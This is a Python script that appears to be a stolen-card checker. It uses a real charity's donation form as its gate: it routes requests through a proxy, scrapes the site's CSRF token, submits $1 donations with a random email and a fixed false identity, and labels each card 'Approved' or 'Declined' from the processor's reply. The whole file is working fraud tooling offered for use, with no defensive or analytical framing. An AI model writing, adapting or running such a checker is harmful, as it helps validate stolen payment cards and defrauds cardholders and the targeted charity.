from httpx import AsyncClient
import random
import string

def random_email() -> str:
    return "".join(random.choice(string.ascii_letters) for x in range(15)) + "@gmail.com"

email = random_email()

async def unk(cc, mes, ano, cvv,proxyg):
    async with AsyncClient(follow_redirects=True, verify=False, proxies=proxyg, timeout=None) as session:
        ip = await session.get('https://api.ipify.org/')
        print(ip.text)
        req1 = await session.get('https://maoschitim.org/')
        crsf = req1.text.split('name="csrf-token" content="')[1].split('"')[0]
        
        headers = {
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'es-ES,es;q=0.9,en;q=0.8',
            'cache-control': 'no-cache',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://maoschitim.org',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://maoschitim.org/',
            'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }

        data = {
            '_token': crsf,
            'first_name': 'Sebastian',
            'last_name': 'Gutierrez',
            'street': '103-105 Central Avenue',
            'city': 'Orange',
            'state': 'NJ',
            'zip': '07050-3824',
            'email': email,
            'phone': '5059947000',
            'amount': '1',
            'source': '',
            'message': '',
            'method': 'card',
            'card_number': cc,
            'cvv': "",
            'expiry': f'{mes}/{ano}',
            'currency': 'USD',
        }

        req2 = await session.post('https://maoschitim.org/donations', headers=headers, data=data)
        print(req2.text)
        if 'thank you for your generous donation of $1.00' in req2.text: 
            status = "Approved ✅"
            mensaje = "Charged 1$"
        else:
            mensaje = req2.text.split('"message":"')[1].split('"')[0]
            if "INV CVV2 MATCH" in mensaje:
                status = "Approved ✅"
            elif "Insufficient funds" in mensaje:
                status = "Approved ✅"
            elif "This Transaction Requires Voice Authentication. Please Call 1-800-337-2255" in mensaje:
                status = "Declined ❌"
                mensaje = "This Transaction Requires Voice Authentication"
            else:
                status = "Declined ❌"
        return status, mensaje
